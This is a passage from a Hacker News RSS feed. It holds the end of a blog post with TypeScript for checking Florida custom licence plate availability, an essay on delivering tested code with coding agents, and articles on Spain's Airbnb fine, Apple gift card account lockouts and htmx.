</p><p><span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>"Failed to extract required form fields from page"</span><span>)</span><span>;</span>
</p><p><span>}</span>
</p><p><span>return</span> <span>{</span>
</p><p><span>viewState</span><span>:</span> <span>viewStateMatch[</span><span>1</span><span>]</span><span>,</span>
</p><p><span>viewStateGenerator</span><span>:</span> <span>viewStateGeneratorMatch[</span><span>1</span><span>]</span><span>,</span>
</p><p><span>eventValidation</span><span>:</span> <span>eventValidationMatch[</span><span>1</span><span>]</span><span>,</span>
</p><p><span>}</span><span>;</span>
</p><p><span>}</span></p></div></pre>
<ol start="3">
<li>Build the POST request with all necessary fields. The actual plate combinations were submitted through <code><span>ctl00$MainContent$txtInputRowXXX</span></code>, where XXX was <code><span>one</span></code> through <code><span>five</span></code>. Using this let me check plate availability 5x faster - and when checking thousands of license plate combinations at a time, it definitely matters.</li>
</ol>
<pre data-theme="unknown" data-lang="typescript" data-ch="true"><div><p><span>function</span> <span>buildFormData</span><span>(</span>
</p><p><span>plates</span><span>:</span> <span>string</span><span>[]</span><span>,</span>
</p><p><span>viewState</span><span>:</span> <span>string</span><span>,</span>
</p><p><span>viewStateGenerator</span><span>:</span> <span>string</span><span>,</span>
</p><p><span>eventValidation</span><span>:</span> <span>string</span>
</p><p><span>)</span><span>:</span> <span>string</span> <span>{</span>
</p><p><span>const</span> <span>params</span> <span>= new</span> <span>URLSearchParams</span><span>()</span><span>;</span>
</p><p><span>params</span><span>.</span><span>append</span><span>(</span><span>"__VIEWSTATE"</span><span>,</span> <span>viewState)</span><span>;</span>
</p><p><span>params</span><span>.</span><span>append</span><span>(</span><span>"__VIEWSTATEGENERATOR"</span><span>,</span> <span>viewStateGenerator)</span><span>;</span>
</p><p><span>params</span><span>.</span><span>append</span><span>(</span><span>"__EVENTVALIDATION"</span><span>,</span> <span>eventValidation)</span><span>;</span>
</p><p><span>const</span> <span>fieldNames</span> <span>=</span> <span>[</span>
</p><p><span>"ctl00$MainContent$txtInputRowOne"</span><span>,</span>
</p><p><span>"ctl00$MainContent$txtInputRowTwo"</span><span>,</span>
</p><p><span>"ctl00$MainContent$txtInputRowThree"</span><span>,</span>
</p><p><span>"ctl00$MainContent$txtInputRowFour"</span><span>,</span>
</p><p><span>"ctl00$MainContent$txtInputRowFive"</span><span>,</span>
</p><p><span>]</span><span>;</span>
</p><p><span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>5</span><span>;</span> <span>i</span><span>++</span><span>) {</span>
</p><p><span>params</span><span>.</span><span>append</span><span>(</span>
</p><p><span>fieldNames[i]</span><span>,</span>
</p><p><span>i</span> <span>&lt;</span> <span>plates</span><span>.</span><span>length</span> <span>?</span> <span>plates[i]</span><span>.</span><span>toUpperCase</span><span>()</span> <span>:</span> <span>""</span>
</p><p><span>)</span><span>;</span>
</p><p><span>}</span>
</p><p><span>params</span><span>.</span><span>append</span><span>(</span><span>"ctl00$MainContent$btnSubmit"</span><span>,</span> <span>"Submit"</span><span>)</span><span>;</span>
</p><p><span>return</span> <span>params</span><span>.</span><span>toString</span><span>()</span><span>;</span>
</p><p><span>}</span></p></div></pre>
<ol start="4">
<li>Submit the POST request and parse the body! Thankfully, the site returned a big ol' <code><span>AVAILABLE</span></code> or <code><span>NOT AVAILABLE</span></code> for each plate combo, so that was easy enough to check in code:</li>
</ol>
<pre data-theme="unknown" data-lang="typescript" data-ch="true"><div><p><span>function</span> <span>extractPlateStatuses</span><span>(</span>
</p><p><span>html</span><span>:</span> <span>string</span><span>,</span>
</p><p><span>plates</span><span>:</span> <span>string</span><span>[]</span>
</p><p><span>)</span><span>:</span> <span>PlateCheckResult</span><span>[] {</span>
</p><p><span>const</span> <span>results</span><span>:</span> <span>PlateCheckResult</span><span>[]</span> <span>=</span> <span>[]</span><span>;</span>
</p><p><span>const</span> <span>labelIds</span> <span>=</span> <span>[</span>
</p><p><span>"MainContent_lblOutPutRowOne"</span><span>,</span>
</p><p><span>"MainContent_lblOutPutRowTwo"</span><span>,</span>
</p><p><span>"MainContent_lblOutputRowThree"</span><span>,</span>
</p><p><span>"MainContent_lblOutputRowFour"</span><span>,</span>
</p><p><span>"MainContent_lblOutputRowFive"</span><span>,</span>
</p><p><span>]</span><span>;</span>
</p><p><span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>plates</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>) {</span>
</p><p><span>const</span> <span>labelId</span> <span>=</span> <span>labelIds[i]</span><span>;</span>
</p><p><span>const</span> <span>regex</span> <span>= new</span> <span>RegExp</span><span>(</span><span>`id="</span><span>${</span><span>labelId</span><span>}</span><span>"[^&gt;]*&gt;([^&lt;]*)&lt;`</span><span>,</span> <span>"i"</span><span>)</span><span>;</span>
</p><p><span>const</span> <span>match</span> <span>=</span> <span>html</span><span>.</span><span>match</span><span>(regex)</span><span>;</span>
</p><p><span>const</span> <span>status</span> <span>=</span> <span>match</span> <span>?</span> <span>match[</span><span>1</span><span>]</span><span>.</span><span>trim</span><span>()</span> <span>:</span> <span>""</span><span>;</span>
</p><p><span>const</span> <span>available</span> <span>=</span> <span>status</span><span>.</span><span>toUpperCase</span><span>()</span> <span>===</span> <span>"AVAILABLE"</span><span>;</span>
</p><p><span>results</span><span>.</span><span>push</span><span>({</span>
</p><p><span>plate</span><span>:</span> <span>plates[i]</span><span>,</span>
</p><p><span>available</span><span>,</span>
</p><p><span>status</span><span>:</span> <span>status</span> <span>||</span> <span>"UNKNOWN"</span><span>,</span>
</p><p><span>})</span><span>;</span>
</p><p><span>}</span>
</p><p><span>return</span> <span>results</span><span>;</span>
</p><p><span>}</span></p></div></pre>
<h2>The Plate War of '25</h2>
<p>Once the script was running smoothly, I created a small microservice that added the results to a Postgres database with the plate combination, along with the last time it was checked. For smaller, high-value combinations (eg, any of the single letter / double letter combinations), I constantly polled every hour or two to check availability. What I <em>didn't</em> realize at the time was the system updated in real time. The moment someone reserved a plate, the Florida DMV's backend reflected the change on the next lookup.</p>
<p>To visualize the data I had scraped, I built a quick Next.js frontend that let me browse through results, filter combinations, and batch-upload plate lists from a text file for quick checking.</p>
<p><img src="https://www.jack.bio/images/licenseplate/four.png" alt="Image.png"></p>
<p>I found some really cool plate combinations, like <code><span>WEBSITE</span></code>, <code><span>SITE</span></code>, and <code><span>CAPTCHA</span></code> . But nothing compared to the spotting one of the only remaining two-letter combination I had seen during my search: <code><span>EO</span></code>.</p>
<p>I saw that <code><span>EO</span></code> was available on November 26th. With Thanksgiving, Black Friday, and the entire weekend shutting down state offices, I assumed I had plenty of time to stroll into the Tax Collector's office and grab it.</p>
<p>December 1st rolled around and I hopped in my car at 9:30am to head towards the tax collector's office. While driving, I got a notification from my service that <code><span>EO</span></code> was no longer available. Someone had the same idea as me, and clearly must have arrived when their doors opened right at 8am. I turned the car around, defeated, and went home.</p>
<p>When I had gotten home, out of spite (and curiosity) I decided to re-run a full check on all two letter license plates.</p>
<p><img src="https://www.jack.bio/images/licenseplate/five.png" alt="Image.png"></p>
<p>Just like that, by some weird divine timing alignment, another two-letter combination had popped back into availability.</p>
<p>My wallowing quickly ended, and I got right back in my car and drove straight to the office. After almost an hour long wait (and a conversation with a slightly confused but very patient office clerk listening to my explanation), I was able to make the reservation. HY was officially my license plate.</p>
<p><img src="https://www.jack.bio/images/licenseplate/six.png" alt="Image.png"></p>
<p>I'd show you a picture, but unfortunately Florida runs on a 60-day delivery timeline for custom plates. Still: it exists, it's paid for, and it's proof that with a little TypeScript and an unreasonable amount of determination, you can claim just about anything.</p></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Your job is to deliver code you have proven to work (755 pts)]]></title>
            <link>https://simonwillison.net/2025/Dec/18/code-proven-to-work/</link>
            <guid>46313297</guid>
            <pubDate>Thu, 18 Dec 2025 14:52:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://simonwillison.net/2025/Dec/18/code-proven-to-work/">https://simonwillison.net/2025/Dec/18/code-proven-to-work/</a>, See on <a href="https://news.ycombinator.com/item?id=46313297">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-permalink-context="/2025/Dec/18/code-proven-to-work/">

<p>18th December 2025</p>



<p>In all of the debates about the value of AI-assistance in software development there’s one depressing anecdote that I keep on seeing: the junior engineer, empowered by some class of LLM tool, who deposits giant, untested PRs on their coworkers—or open source maintainers—and expects the “code review” process to handle the rest.</p>
<p>This is rude, a waste of other people’s time, and is honestly a dereliction of duty as a software developer.</p>
<p><strong>Your job is to deliver code you have proven to work.</strong></p>
<p>As software engineers we don’t just crank out code—in fact these days you could argue that’s what the LLMs are for. We need to deliver <em>code that works</em>—and we need to include <em>proof</em> that it works as well.  Not doing that directly shifts the burden of the actual work to whoever is expected to review our code.</p>
<h4 id="how-to-prove-it-works">How to prove it works</h4>
<p>There are two steps to proving a piece of code works. Neither is optional.</p>
<p>The first is <strong>manual testing</strong>. If you haven’t seen the code do the right thing yourself, that code doesn’t work. If it does turn out to work, that’s honestly just pure chance.</p>
<p>Manual testing skills are genuine skills that you need to develop. You need to be able to get the system into an initial state that demonstrates your change, then exercise the change, then check and demonstrate that it has the desired effect.</p>
<p>If possible I like to reduce these steps to a sequence of terminal commands which I can paste, along with their output, into a comment in the code review. Here’s a <a href="https://github.com/simonw/llm-gemini/issues/116#issuecomment-3666551798">recent example</a>.</p>
<p>Some changes are harder to demonstrate. It’s still your job to demonstrate them! Record a screen capture video and add that to the PR. Show your reviewers that the change you made actually works.</p>
<p>Once you’ve tested the happy path where everything works you can start trying the edge cases. Manual testing is a skill, and finding the things that break is the next level of that skill that helps define a senior engineer.</p>
<p>The second step in proving a change works is <strong>automated testing</strong>. This is so much easier now that we have LLM tooling, which means there’s no excuse at all for skipping this step.</p>
<p>Your contribution should <a href="https://simonwillison.net/2022/Oct/29/the-perfect-commit/">bundle the change</a> with an automated test that proves the change works. That test should fail if you revert the implementation.</p>
<p>The process for writing a test mirrors that of manual testing: get the system into an initial known state, exercise the change, assert that it worked correctly. Integrating a test harness to productively facilitate this is another key skill worth investing in.</p>
<p>Don’t be tempted to skip the manual test because you think the automated test has you covered already! Almost every time I’ve done this myself I’ve quickly regretted it.</p>
<h4 id="make-your-coding-agent-prove-it-first">Make your coding agent prove it first</h4>
<p>The most important trend in LLMs in 2025 has been the explosive growth of <strong>coding agents</strong>—tools like Claude Code and Codex CLI that can actively execute the code they are working on to check that it works and further iterate on any problems.</p>
<p>To master these tools you need to learn how to get them to <em>prove their changes work</em> as well.</p>
<p>This looks exactly the same as the process I described above: they need to be able to manually test their changes as they work, and they need to be able to build automated tests that guarantee the change will continue to work in the future.</p>
<p>Since they’re robots, automated tests and manual tests are effectively the same thing.</p>
<p>They do feel a little different though. When I’m working on CLI tools I’ll usually teach Claude Code how to run them itself so it can do one-off tests, even though the eventual automated tests will use a system like <a href="https://click.palletsprojects.com/en/stable/testing/">Click’s CLIRunner</a>.</p>
<p>When working on CSS changes I’ll often encourage my coding agent to take screenshots when it needs to check if the change it made had the desired effect.</p>
<p>The good news about automated tests is that coding agents need very little encouragement to write them. If your project has tests already most agents will extend that test suite without you even telling them to do so. They’ll also reuse patterns from existing tests, so keeping your test code well organized and populated with patterns you like is a great way to help your agent build testing code to your taste.</p>
<p>Developing good taste in testing code is another of those skills that differentiates a senior engineer.</p>
<h4 id="the-human-provides-the-accountability">The human provides the accountability</h4>
<p><a href="https://simonwillison.net/2025/Feb/3/a-computer-can-never-be-held-accountable/">A computer can never be held accountable</a>. That’s your job as the human in the loop.</p>
<p>Almost anyone can prompt an LLM to generate a thousand-line patch and submit it for code review. That’s no longer valuable. What’s valuable is contributing <em>code that is proven to work</em>.</p>
<p>Next time you submit a PR, make sure you’ve included your evidence that it works as it should.</p>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Spain fines Airbnb €65M: Why the government is cracking down on illegal rentals (115 pts)]]></title>
            <link>https://www.euronews.com/travel/2025/12/15/spain-fines-airbnb-65-million-why-the-government-is-cracking-down-on-illegal-rentals</link>
            <guid>46313266</guid>
            <pubDate>Thu, 18 Dec 2025 14:49:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.euronews.com/travel/2025/12/15/spain-fines-airbnb-65-million-why-the-government-is-cracking-down-on-illegal-rentals">https://www.euronews.com/travel/2025/12/15/spain-fines-airbnb-65-million-why-the-government-is-cracking-down-on-illegal-rentals</a>, See on <a href="https://news.ycombinator.com/item?id=46313266">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          
              





                          <p>
         Published on
            <time datetime="2025-12-15 15:31:52 +01:00">15/12/2025 - 15:31 GMT+1</time>
            </p>

        </div><div>
  <p>Spain has just drawn a hard line on short-term rentals.</p>
<p>The country has fined Airbnb €65 million for continuing to advertise short-term rental properties that were banned or lacked proper licences to operate.</p>
<p>The country’s consumer affairs ministry said the fine is final and ordered the US-based platform to remove the illegal listings immediately.</p>
<p>Officials said more than <a href="https://www.euronews.com/travel/2025/06/20/spanish-court-rejects-airbnb-appeal-and-keeps-order-to-block-66000-rule-breaking-listings"><strong>65,000 Airbnb adverts</strong></a> breached Spanish consumer protection rules, including listing properties without licences or with licence numbers that did not match official registers.</p>
<p>The penalty is equal to six times the profits Airbnb made between when authorities warned the company about its offending listings and when they were taken down.</p>
<p>It also comes as pressure mounts on the government to curb tourist accommodation amid a deepening housing crisis, especially in major cities grappling with huge tourism numbers.</p>
<h2>Why did Spain fine Airbnb?</h2>
<p>According to the Spanish authorities, 65,122 Airbnb listings violated regulations designed to protect tenants and consumers.</p>
<p>Many of the properties were located in regions where short-term rentals are restricted or require explicit authorisation.</p>
<p>The consumer affairs ministry said platforms such as <a href="https://www.euronews.com/travel/2025/10/24/airbnb-safety-reviews-can-turn-off-some-travellers-could-increased-transparency-help"><strong>Airbnb</strong></a> are expected to check that properties advertised in Spain meet local and regional housing rules, including the use of valid licence numbers.</p>


<p>When they do not, it added, these rentals stay on the market longer than they should, which reduces the number of homes available to residents looking for long-term housing.</p>
<p>In a statement released by the consumer affairs ministry, consumer rights minister Pablo Bustinduy said there were “thousands of families who are living on the edge” because of the country’s housing crunch, while some companies were profiting from “business models that expel people from their homes”.</p>
<p>The crackdown has not been limited to Airbnb, either. In June, Spain also ordered Booking.com to remove more than 4,000 illegal accommodation listings.</p>
<h2>Barcelona’s Airbnb ban and growing public anger in Spain</h2>
<p>Barcelona has become the most visible flashpoint in Spain’s fight against <a href="https://www.euronews.com/travel/2025/12/05/milan-bans-self-check-in-key-boxes-for-short-term-rentals-starting-in-2026"><strong>short-term rentals</strong></a>.</p>
<p>This year, the city announced plans to phase out all tourist apartments by 2028, effectively banning platforms like Airbnb from operating private holiday rentals in residential buildings.</p>
<p>City officials argue that short-term rentals have hollowed out local neighbourhoods, pushed residents out of the rental market and reshaped entire districts around tourism.</p>
<p>Local communities have increasingly echoed those concerns, staging protests – from <a href="https://www.euronews.com/travel/2024/12/23/from-street-protests-to-an-airbnb-ban-all-the-ways-barcelona-said-no-to-tourists-in-2024"><strong>marches</strong></a> to impromptu<a href="https://www.euronews.com/travel/2025/06/17/how-the-water-gun-has-became-a-symbol-for-barcelona-residents-fed-up-with-the-tourism-indu"> <strong>water pistol</strong></a> attacks – against mass tourism and living costs.</p>


<p>Elsewhere in Spain, regional and national governments have followed a similar path.</p>
<p>Authorities recently removed more than<a href="https://www.euronews.com/travel/2025/09/15/spain-removes-53000-illegal-tourist-flats-from-the-register-to-boost-permanent-rental-mark"> <strong>53,000 illegal tourist flats</strong></a> from official registers nationwide, the bulk of them in Andalusia, the Canary Islands, Catalonia and Valencia.</p>
<p>A record 94 million foreign tourists visited Spain in 2024. This year is<a href="https://www.euronews.com/travel/2025/10/02/spain-smashes-summer-visitor-records-in-2025-despite-overtourism-measures"> <strong>on track</strong></a> to top that record.</p>
<p>While tourism remains an economic pillar, officials say tighter regulation of short-term rentals is essential to balance visitor growth with quality of life for local residents. </p>


  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Are Apple gift cards safe to redeem? (519 pts)]]></title>
            <link>https://daringfireball.net/linked/2025/12/17/are-apple-gift-cards-safe-to-redeem</link>
            <guid>46313061</guid>
            <pubDate>Thu, 18 Dec 2025 14:26:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://daringfireball.net/linked/2025/12/17/are-apple-gift-cards-safe-to-redeem">https://daringfireball.net/linked/2025/12/17/are-apple-gift-cards-safe-to-redeem</a>, See on <a href="https://news.ycombinator.com/item?id=46313061">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="Box">


<dl>
<dt><a href="https://tidbits.com/2025/12/17/compromised-apple-gift-card-leads-to-apple-account-lockout/">Are Apple Gift Cards Safe to Redeem?</a></dt>
<dd>
<p>You will recall <a href="https://hey.paris/posts/appleid/">the Apple Account fiasco of Paris Buttfield-Addison</a>, whose entire iCloud account and library of iTunes and App Store media purchases were lost when his Apple Account was locked, seemingly after attempted to redeem a tampered $500 Apple Gift Card that he purchased from a major retailer. <a href="https://daringfireball.net/linked/2025/12/13/buttfield-addison-apple-account">I wrote about it</a>, as did <a href="https://mjtsai.com/blog/2025/12/13/locked-out-of-apple-account-due-to-gift-card/">Michael Tsai</a>, <a href="https://pxlnv.com/linklog/apple-account-lockout/">Nick Heer</a>, <a href="https://appleinsider.com/articles/25/12/13/locked-out-how-a-gift-card-purchase-destroyed-an-apple-account">Malcom Owen at AppleInsider</a>, and <a href="https://www.theregister.com/2025/12/15/apple_dev_bad_gift_card_code/">Brandon Vigliarolo at The Register</a>. Buttfield-Addison has updated his post a few times, including a note that Executive Relations — Apple’s top-tier support SWAT team — was looking into the matter. To no avail, at least yet, alas.</p>

<p><a href="https://tidbits.com/2025/12/17/compromised-apple-gift-card-leads-to-apple-account-lockout/">Adam Engst, writing at TidBITS today</a>:</p>

<blockquote>
  <p>There is one way the Apple community could exert some leverage
over Apple. Since innocently redeeming a compromised Apple Gift
Card can have serious negative consequences, we should all avoid
buying Apple Gift Cards and spread the word as widely as possible
that they could essentially be malware. Sure, most Apple Gift
Cards are probably safe, but do you really want to be the person
who gives a close friend or beloved grandchild a compromised card
that locks their Apple Account? And if someone gives you one,
would you risk redeeming it? It’s digital Russian roulette.</p>
</blockquote>

<p>I suspect that one part of Buttfield-Addison’s fiasco is the fact that his seemingly problematic gift card was for $500, not a typical amount like $25, but that’s just a suspicion on my part. We don’t know — because key to the Kafka-esque nature of the whole nightmare is that his account cancellation was a black box. Not only has Apple not yet restored his deactivated Apple Account, at no point in the process have they explained why it was deactivated in the first place. We’re left to guess that it was related to the tampered gift card and that the relatively high value of the card in question was related. $500 is a higher value than average for an Apple gift card, but that amount is less than the average price for a single iPhone. Apple itself <a href="https://daringfireball.net/misc/2025/12/apple-gift-card-2001-dollars.png">sets a limit of $2,000</a> on <a href="https://www.apple.com/shop/buy-giftcard/giftcard">gift cards in the US</a>, so $500 shouldn’t be considered an inherently suspicious amount. </p>

<p>The whole thing <em>does</em> make me nervous about redeeming, or giving, Apple gift cards. Scams in general seem to be getting more sophisticated. Buttfield-Addison says he bought the card directly from “a major brick-and-mortar retailer (Australians, think Woolworths scale; Americans, think Walmart scale)”. Until we get some clarity on this I feel like I’d only redeem Apple gift cards at an Apple retail store, for purchases <em>not</em> tied to my Apple Accounts. (I’ve <a href="https://daringfireball.net/linked/2025/02/11/about-migrating-apple-account-purchases-between-accounts">still</a> got two — one for iCloud, one for media purchases.)</p>

<p>In addition to the uncertainty this leaves us with regarding the redemption of Apple gift cards, I have to wonder what the hell happens to these Apple Accounts that are deactivated for suspected fraud. You would think that once escalated high enough in Apple’s customer support system, someone at Apple could just flip a switch and re-activate the account. The fact that Buttfield-Addison’s account has not yet been restored, despite the publicity and apparent escalation to Executive Relations, makes me think it <em>can’t</em> be restored. I don’t know how that can be, but it sure seems like that’s the case. Darth Vader’s “And no disintegrations” admonition ought to be in effect for something like this. I have the sinking feeling that the best Apple is able to do is something seemingly ridiculous, like refund Buttfield-Addison for every purchase he ever made on the account and tell him to start over with a new one.</p>

<p>My other question: Were any humans involved in the decision to deactivate (disintegrate?) his account, or was it determined purely by some sort of fraud detection algorithm?</p>

<p><strong>Update:</strong> Very shortly after I posted the above, Buttfield-Addison <a href="https://hey.paris/posts/appleid/">posted an update</a> that his account was successfully restored by the ninja on Apple’s Executive Relations team assigned to his case. That’s great. But that still leaves the question of how safe Apple gift cards are to redeem on one’s Apple Account. It also leaves the question of how this happened in the first place, and why it took the better part of a week to resolve.</p>

<p>★ <em>Wednesday, 17 December 2025</em></p>
</dd>
</dl>




<!-- Google Analytics -->

<!-- 
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-593949-1']);
  _gaq.push (['_gat._anonymizeIp']);
  _gaq.push(['_trackPageview']);
  (function() {
	var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
	ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
	var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
 -->

<!-- Asynchronously load Mint -->
<!-- No, screw mint
<script type="text/javascript">
(function () {
	var ma = document.createElement('script');
	ma.type = 'text/javascript';
	ma.src = '/mint/?js';
	ma.async = true;
	var s = document.getElementsByTagName('script')[0];
	s.parentNode.insertBefore(ma, s);
})();
</script>
-->
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Please Just Try Htmx (500 pts)]]></title>
            <link>http://pleasejusttryhtmx.com/</link>
            <guid>46312973</guid>
            <pubDate>Thu, 18 Dec 2025 14:18:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://pleasejusttryhtmx.com/">http://pleasejusttryhtmx.com/</a>, See on <a href="https://news.ycombinator.com/item?id=46312973">Hacker News</a></p>
<div id="readability-page-1" class="page">


<p><em>A measured-yet-opinionated plea from someone who's tired of watching you suffer</em></p>

<p>Look. I'm not going to call you a <a href="https://motherfuckingwebsite.com/">fucking moron</a> every other sentence. That's been done. It's a whole genre now. And honestly? HTMX doesn't need me to scream at you to make its point.</p>

<p>The sweary web manifesto thing is fun—I've enjoyed reading them—but let's be real: yelling "<a href="https://justfuckingusehtml.com/">JUST USE HTML</a>" or "<a href="https://justfuckingusereact.com/">JUST FUCKING USE REACT</a>" hasn't actually changed anyone's stack. People nod, chuckle, and then go right back to fighting their raw JS or their webpack config.<sup><a href="#fn1" id="fnref1">1</a></sup></p>

<p>So I'm going to try something different. I'll still swear (I'm not a fucking saint), but I'm also going to <em>show you something</em>, in the course of imploring you, for your own sanity and happiness, to at least please just <em>try</em> htmx.</p>

<h2>The False Choice</h2>

<p>Right now, the shouters are offering you two options:</p>

<p><strong>Option A: "Just use HTML!"</strong> And they're not wrong. HTML is shockingly capable. Forms work. Links work. The <code>&lt;dialog&gt;</code> element exists now. The web was built on this stuff and it's been chugging along since Tim Berners-Lee had hair. And a little <em>tasteful</em> CSS can go <a href="http://bettermotherfuckingwebsite.com/">a long motherfucking way</a>.</p>

<p>But sometimes—and here's where it gets uncomfortable—you actually <em>do</em> need a button that updates part of a page without reloading the whole damn thing. You <em>do</em> need a search box that shows results as you type. You <em>do</em> need interactivity.</p>

<p>So you turn to:</p>

<p><strong>Option B: React (or Vue, or Svelte, or Angular if you're being punished for something).</strong></p>

<p>And suddenly you've got:</p>
<ul>
    <li>A <code>package.json</code> with 847 dependencies</li>
    <li>A build step that takes 45 seconds (if the CI gods are merciful)</li>
    <li>State management debates polluting your pull requests</li>
    <li>Junior devs losing their minds over why <code>useEffect</code> runs twice</li>
    <li>A bundle size that would make a 56k modem weep</li>
</ul>

<p>For what? A to-do list? A contact form? A dashboard that displays some numbers from a database?</p>

<p>This is the false choice: raw HTML's limitations <em>or</em> JavaScript framework purgatory.</p>

<p>There's a third option. I'm begging you, please just try it.</p>

<h2>HTMX: The Middle Path</h2>

<p>What if I told you:</p>
<ul>
    <li><strong>Any HTML element</strong> can make an HTTP request</li>
    <li>The server just returns <strong>HTML</strong> (not JSON, actual HTML)</li>
    <li>That HTML gets <strong>swapped into the page</strong> wherever you want</li>
    <li>You write <strong>zero JavaScript</strong></li>
    <li>The whole library is <strong>~14kb gzipped</strong></li>
</ul>

<p>That's HTMX. That's literally the whole thing.</p>

<p>Here's a button that makes a POST request and replaces itself with the response:</p>

<pre><code>&lt;button hx-post="/clicked" hx-swap="outerHTML"&gt;
    Click me
&lt;/button&gt;</code></pre>

<p>When you click it, HTMX POSTs to <code>/clicked</code>, and whatever HTML the server returns replaces the button. No <code>fetch()</code>. No <code>setState()</code>. No <code>npm install</code>. No fucking webpack config.</p>

<p>The server just returns HTML. Like it's 2004, except your users have fast internet and your server can actually handle it. It's the <a href="https://hypermedia.systems/">hypermedia architecture</a> the entire freaking web was designed for, but with modern conveniences.</p>

<h2>Don't Believe Me? Click Things.</h2>

<p>This page uses HTMX. These demos actually work.</p>

<div>
    <h3>Demo 1: Click a Button</h3>
    <p>This button makes a POST request and swaps in the response:</p>
    
</div>

<div>
    <h3>Demo 2: Load More Content</h3>
    <p>This button fetches additional content and appends it below:</p>
    <p>Here's some initial content.</p>
    </div>

<div>
    <h3>Demo 3: Live Search</h3>
    <p>Type something—results update as you type (debounced, of course):</p>
    <p><em>Results will appear here...</em>
    </p>
</div>

<p>
    <strong>That's HTMX.</strong> I didn't write JavaScript to make those work. I wrote HTML attributes. The "server" (mocked client-side for this demo, but the htmx code is real) returns HTML fragments, and HTMX swaps them in. The behavior is right there in the markup—you don't have to hunt through component files and state management code to understand what a button does. HTMX folks call this <strong>"Locality of Behavior"</strong> and once you have it, you'll miss it everywhere else.
</p>

<h2>The Numbers</h2>

<p>Anecdotes are nice. Data is better.</p>

<p>A company called <strong><a href="https://htmx.org/essays/a-real-world-react-to-htmx-port/">Contexte</a></strong> rebuilt their production SaaS app from React to Django templates with HTMX. Here's what happened:</p>

<div>
    <div>
        <p>67%</p>
        <p>less code</p>
        <p>(21,500 → 7,200 lines)</p>
    </div>
    <div>
        <p>96%</p>
        <p>fewer JS dependencies</p>
        <p>(255 → 9 packages)</p>
    </div>
    <div>
        <p>88%</p>
        <p>faster builds</p>
        <p>(40s → 5s)</p>
    </div>
    <div>
        <p>50-60%</p>
        <p>faster page loads</p>
        <p>(2-6s → 1-2s)</p>
    </div>
</div>

<p>They deleted two-thirds of their codebase and the app got <em>better</em>. Every developer became "full-stack" because there wasn't a separate frontend to specialize in anymore.</p>

<p>Now, they note this was a content-focused app and not every project will see these exact numbers. Fair. But even if you got <em>half</em> these improvements, wouldn't that be worth a weekend of experimentation?</p>

<h2>For the Skeptics</h2>

<div>
    <p>"But what about complex client-side state management?"</p>
    <p>You probably don't have complex client-side state. You have forms. You have lists. You have things that show up when you click other things. HTMX handles all of that.</p>
    <p>If you're building Google Docs, sure, you need complex state management. But you're not building Google Docs. You're building a CRUD app that's convinced it's Google Docs.</p>
</div>

<div>
    <p>"But the React ecosystem!"</p>
    <p>The ecosystem is why your <code>node_modules</code> folder is 2GB. The ecosystem is why there are 14 ways to style a component and they all have tradeoffs. The ecosystem is why "which state management library" is somehow still a debate.</p>
    <p>HTMX's ecosystem is: your server-side language of choice. That's it. That's the ecosystem.</p>
</div>

<div>
    <p>"But SPAs feel faster!"</p>
    <p>After the user downloads 2MB of JavaScript, waits for it to parse, waits for it to execute, waits for it to hydrate, waits for it to fetch data, waits for it to render... yes, then subsequent navigations feel snappy. Congratulations.</p>
    <p>HTMX pages load fast the <em>first</em> time because you're not bootstrapping an application runtime. And subsequent requests are fast because you're only swapping the parts that changed.</p>
</div>

<div>
    <p>"But I need [specific React feature]!"</p>
    <p>Maybe you do. I'm not saying React is never the answer. I'm saying it's the answer to about 10% of the problems it's used for, and the costs of reaching for it reflexively are staggering.</p>
    <p>Most teams don't fail because they picked the wrong framework. They fail because they picked <em>too much</em> framework. HTMX is a bet on simplicity, and simplicity tends to win over time.</p>
</div>

<h2>When NOT to Use HTMX</h2>

<p>I'm not a zealot. HTMX isn't for everything.</p>

<ul>
    <li><strong>Real-time collaborative editing</strong> (Google Docs, Figma)</li>
    <li><strong>Heavy client-side computation</strong> (video editors, CAD tools)</li>
    <li><strong>Offline-first applications</strong> (though you can combine approaches)</li>
    <li><strong>Genuinely complex UI state</strong> (not "my form has validation" complex—actually complex)</li>
</ul>

<p>But be honest with yourself: is that what you're building?</p>

<p>Or are you building another dashboard, another admin panel, another e-commerce site, another blog, another SaaS app that's fundamentally just forms and tables and lists? Be honest. I won't tell anyone. We all have to pay the bills.</p>

<p>For that stuff, HTMX is embarrassingly good. Like, "why did we make it so complicated" good. Like, "oh god, we wasted so much time" good.</p>

<h2>So Just Try It</h2>

<div>
    <p>You've tried React. You've tried Vue. You've tried Angular and regretted it. You've tried whatever meta-framework is trending on Hacker News this week.</p>

    <p><strong>Just try HTMX.</strong> One weekend. Pick a side project. Pick that internal tool nobody cares about. Pick the thing you've been meaning to rebuild anyway.</p>

    <p>Add one <code>&lt;script&gt;</code> tag. Write one <code>hx-get</code> attribute. Watch what happens.</p>

    <p>If you hate it, you've lost a weekend. But you won't hate it. You'll wonder why you ever thought web development had to be so fucking complicated.</p>

    <p>
        <strong>Learn more:</strong><br>
        <a href="https://htmx.org/">htmx.org</a> — The official site and docs<br>
        <a href="https://hypermedia.systems/">hypermedia.systems</a> — The free book on hypermedia-driven apps
    </p>
</div>

<hr>
<section>
